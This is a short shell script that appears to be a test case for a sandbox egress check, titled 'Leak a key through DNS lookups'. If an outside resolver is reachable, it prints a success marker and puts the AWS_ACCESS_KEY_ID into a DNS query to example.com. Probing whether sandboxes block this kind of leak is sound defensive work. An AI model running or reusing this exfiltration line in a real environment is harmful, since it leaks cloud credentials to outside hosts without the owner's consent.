#!/bin/sh
# title: Leak a key through DNS lookups
# check: marker
# A DNS tunnel needs the sandbox to reach an outside resolver. If it can, the key goes out as a label.
if getent hosts example.com > /dev/null 2>&1; then
  echo SENTINEL_ATTACK_SUCCEEDED
  getent hosts "$(echo "$AWS_ACCESS_KEY_ID" | tr 'A-Z' 'a-z').example.com" > /dev/null 2>&1 || true
fi
